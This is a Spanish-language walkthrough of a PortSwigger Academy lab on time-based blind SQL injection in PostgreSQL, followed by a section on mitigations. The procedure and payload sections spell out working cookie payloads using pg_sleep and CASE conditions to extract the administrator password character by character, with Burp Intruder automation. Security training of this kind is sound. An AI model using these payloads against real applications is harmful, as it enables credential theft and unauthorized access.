Lab15: Blind SQL injection with time delays and information retrieval

Nivel Practitioner
Tipo de SQLi Blind SQL Injection with time delay and information retrieval

Objetivo

Extraer la contraseña del usuario administrator utilizando consultas SQL basadas en time delays, empleando Burp Intruder para automatizar la comprobación del tamaño y los caracteres de la contraseña.

Vulnerabilidad

La cookie TrackingId es vulnerable a inyección SQL. La aplicación no muestra cambios en el contenido ni errores, pero permite ejecutar consultas condicionales que introducen pausas en la base de datos dependiendo de si una condición es verdadera o falsa.

Al combinar la función de delay (pg_sleep) con una estructura condicional (CASE WHEN ... THEN pg_sleep(...) ELSE ... END), el atacante puede hacer preguntas booleanas a la base de datos y determinar la respuesta midiendo el tiempo que tarda el servidor en responder.

Este laboratorio utiliza PostgreSQL, por lo que la función de delay es pg_sleep().

Procedimiento

  1. Enviar la petición al Repeater de BurpSuite y comprobar que el query de time delay funciona: 
    Cookie: TrackingId=xyz' || pg_sleep(10)--

    Se verifica que la respuesta tarda aproximadamente 10 segundos.

  2. Introducir una estructura condicional para usar el time delay como indicador booleano: 
    Cookie: TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)--

    Con 1=1 (verdadero), hay un delay de 2 segundos. Con 1=2 (falso), no hay delay.

  3. Verificar la existencia de la tabla users y el usuario administrator: 
    Cookie: TrackingId=xyz' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--

    Si hay delay, el usuario administrator existe.

  4. Determinar la longitud de la contraseña: 
    Cookie: TrackingId=xyz' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=1) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--

    Se incrementa el número (LENGTH(password)=2, =3, etc.) hasta que aparece el delay. Cuando aparece, se ha encontrado la longitud exacta.

    Para este laboratorio, la contraseña tiene 20 caracteres.

  5. Extraer la contraseña carácter por carácter utilizando SUBSTRING: 
    Cookie: TrackingId=xyz' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--
  6. Configurar Burp Intruder para automatizar el proceso:
    • Enviar la petición al Intruder.
    • Marcar como payloads la posición del carácter (1,1; 2,1; etc.) y el carácter a probar (a-z, 0-9).
    • Configurar el tipo de payload: números para la posición y caracteres para el valor.
    • Crear un resource pool personalizado con 1 hilo para evitar interferencias en los delays.
  7. Identificar los caracteres correctos: Cuando la respuesta del servidor tarde aproximadamente 2 segundos, se confirma que el carácter probado es correcto.
  8. Repetir el proceso para cada posición (1 a 20) hasta obtener la contraseña completa.
  9. Iniciar sesión con las credenciales obtenidas del usuario administrator.

Payloads utilizados

Payload de confirmación (delay básico)

xyz' || pg_sleep(10)--

Payload con CASE condicional

xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)--

Payload para verificar existencia de administrator

xyz' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--

Payload para determinar longitud

xyz' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--

Payload para extraer caracteres

xyz' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--

Explicación de los payloads

  • xyz': Cierra la cadena original de la cookie TrackingId.
  • ||: Operador de concatenación en PostgreSQL.
  • (SELECT CASE WHEN (condición) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users): Subconsulta que evalúa la condición. Si es verdadera, ejecuta pg_sleep(2) causando un delay de 2 segundos. Si es falsa, ejecuta pg_sleep(0) (sin delay).
  • username='administrator': Condición que verifica si el usuario es administrator.
  • LENGTH(password)=20: Verifica si la longitud de la contraseña es 20.
  • SUBSTRING(password,1,1)='a': Extrae el primer carácter de la contraseña y lo compara con 'a'.
  • FROM users: Especifica la tabla donde buscar.
  • --: Comenta el resto de la consulta original.

Proceso con Burp Intruder

  • Payload position 1: Número de posición (1-20).
  • Payload position 2: Carácter a probar (a-z, 0-9).
  • Resource pool: Configurar con 1 hilo para evitar interferencias y medir correctamente los delays.
  • Análisis de resultados: Ordenar por tiempo de respuesta. Las respuestas con mayor tiempo (aprox. 2000 ms) indican caracteres correctos.

Ejemplo de contraseña extraída: 8fg5h2j1k4m9p3q7r2s5

Verificación del ataque

La vulnerabilidad se confirma cuando se logra reconstruir la contraseña completa del usuario administrator mediante las diferencias en los tiempos de respuesta:

  • Las peticiones con el carácter correcto tardan aproximadamente 2 segundos.
  • Las peticiones con caracteres incorrectos responden inmediatamente.
  • La diferencia de tiempo es consistente y medible.

Una vez obtenida la contraseña (por ejemplo, "8fg5h2j1k4m9p3q7r2s5"), se introduce en el formulario de login junto con el usuario "administrator" y se accede al panel de administración, demostrando que:

  • La inyección SQL ciega basada en tiempo permite extraer información sensible.
  • La técnica es efectiva incluso cuando no hay cambios visuales en la página.
  • Burp Intruder automatiza eficientemente el proceso de extracción.

Resultado esperado: El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte del código SQL, bloqueando cualquier intento de inyección, incluyendo funciones como pg_sleep().

SELECT * FROM tracking WHERE id = ?

Validación de Entradas

Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible (alfanumérico de longitud fija), rechazar cualquier valor que no cumpla con ese patrón.

Límite de Tiempo de Ejecución

Configurar límites de tiempo de ejecución para las consultas en la base de datos, de modo que funciones como pg_sleep() no puedan ejecutarse o sean interrumpidas después de un tiempo razonable.

Rate Limiting

Implementar mecanismos de rate limiting que detecten y bloqueen múltiples peticiones con diferentes TrackingId en un corto período de tiempo, dificultando ataques de fuerza bruta como los realizados con Intruder.

Principio de Menor Privilegio

La cuenta de base de datos debe tener permisos mínimos. No debería tener permiso para ejecutar funciones como pg_sleep() que no son necesarias para el funcionamiento normal de la aplicación.

Web Application Firewall (WAF)

Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de usar funciones de delay y estructuras CASE condicionales.

Eliminar la Capacidad de Ejecutar Funciones Peligrosas

En PostgreSQL, revocar el permiso de ejecución de funciones como pg_sleep() para el usuario de la aplicación:

REVOKE EXECUTE ON FUNCTION pg_sleep(integer) FROM app_user;
